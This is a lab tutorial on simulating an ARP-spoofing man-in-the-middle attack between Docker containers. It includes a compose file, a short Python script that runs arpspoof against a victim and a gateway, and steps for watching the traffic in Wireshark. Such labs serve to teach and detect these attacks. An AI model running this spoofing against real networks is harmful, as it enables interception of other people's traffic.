
```
# Network Security Lab: Man-in-the-Middle Attack Simulation with Docker

## Introduction
In this lab, you will simulate a Man-in-the-Middle (MITM) attack using Docker and Docker Compose. The goal is to set up two virtual machines: one representing a victim and the other an attacker, connected through a common network. You will use Wireshark to analyze network traffic and a custom script to mimic the behavior of Winarp.exe to carry out an ARP spoofing attack.

## Prerequisites
Before starting this lab, make sure you have the following installed:
- Docker Desktop (supports both x86 and Apple Silicon)
- Wireshark (for network traffic analysis)
- Basic understanding of ARP spoofing and networking concepts

## Lab Setup

### Step 1: Install Docker Desktop
Docker Desktop is required to simulate the victim and attacker machines. If you haven’t installed Docker Desktop, follow the installation instructions here: [Docker Desktop Installation](https://docs.docker.com/desktop/).

Once installed, verify that both Docker and Docker Compose are working by running:
```

```bash
docker --version
docker-compose --version
```

### Step 2: Clone the Lab Repository
The lab environment is available as a Docker Compose configuration. Clone the repository to your local machine using:

```bash
git clone https://github.com/your-lab-repo/mitm-docker-lab.git
cd mitm-docker-lab
```

### Step 3: Docker Compose Configuration
The following `docker-compose.yml` sets up two containers (victim and attacker) connected through a common network. The attacker container will have elevated network permissions to simulate an MITM attack.

```yaml
version: '3'
services:
  victim:
    image: ubuntu:latest
    container_name: victim
    command: sleep infinity
    networks:
      - mitm_net
    cap_add:
      - NET_RAW

  attacker:
    image: ubuntu:latest
    container_name: attacker
    command: sleep infinity
    networks:
      - mitm_net
    cap_add:
      - NET_ADMIN

networks:
  mitm_net:
    driver: bridge
```

### Step 4: MITM Attack Script
The following script simulates the ARP spoofing attack. It should be executed in the attacker container.

```python
# Basic Python script to simulate MITM setup
import os

victim_ip = input("Enter victim IP: ")
gateway_ip = input("Enter gateway IP: ")

# Run ARP spoofing (this needs to be done in the attacker container)
os.system(f"arpspoof -i eth0 -t {victim_ip} {gateway_ip}")
os.system(f"arpspoof -i eth0 -t {gateway_ip} {victim_ip}")
```

### Step 5: Run the Lab Environment
Once you have the `docker-compose.yml` file and the MITM script in place, you can start the lab environment using the following command:

```bash
docker-compose up
```

This will start two containers: `victim` and `attacker`, both connected through a common network.

### Step 6: Launch the Attack
To launch the MITM attack, follow these steps:

1. Open a terminal window for the attacker container:
   ```bash
   docker exec -it attacker bash
   ```

2. Run the MITM Python script inside the attacker container. The script will prompt you to enter the victim's IP and the gateway IP.

   Assuming your victim container has an IP of `172.18.0.2` and the gateway has an IP of `172.18.0.1`, you would run:
   ```bash
   python3 mitm_script.py
   ```

   Then, input the victim IP and gateway IP as prompted:
   ```bash
   Enter victim IP: 172.18.0.2
   Enter gateway IP: 172.18.0.1
   ```

   This will initiate the ARP spoofing attack.

### Step 7: Generate Network Traffic on the Victim
You can simulate network traffic from the victim container by running basic network commands like `ping` or `curl`:

1. Open a terminal for the victim container:
   ```bash
   docker exec -it victim bash
   ```

2. Use the `ping` command to generate network traffic:
   ```bash
   ping 172.18.0.1  # Gateway IP
   ```

3. You can also try `curl` to generate HTTP requests:
   ```bash
   curl http://example.com
   ```

### Step 8: Use Wireshark to Analyze Traffic
Launch Wireshark on your host machine and start capturing traffic on the Docker bridge network (usually `docker0`).

You should be able to see the victim's traffic, including ARP requests and responses. Monitor the traffic for signs of ARP spoofing and inspect how the attacker is intercepting communications.

### Step 9: Clean Up
When you are done with the lab, you can stop and remove the Docker containers by running:

```bash
docker-compose down
```

## Conclusion
In this lab, you successfully simulated a Man-in-the-Middle attack using Docker and Docker Compose. You learned how ARP spoofing works and used Wireshark to analyze the network traffic. Be sure to review the captured traffic to fully understand how MITM attacks can be executed and detected.
```
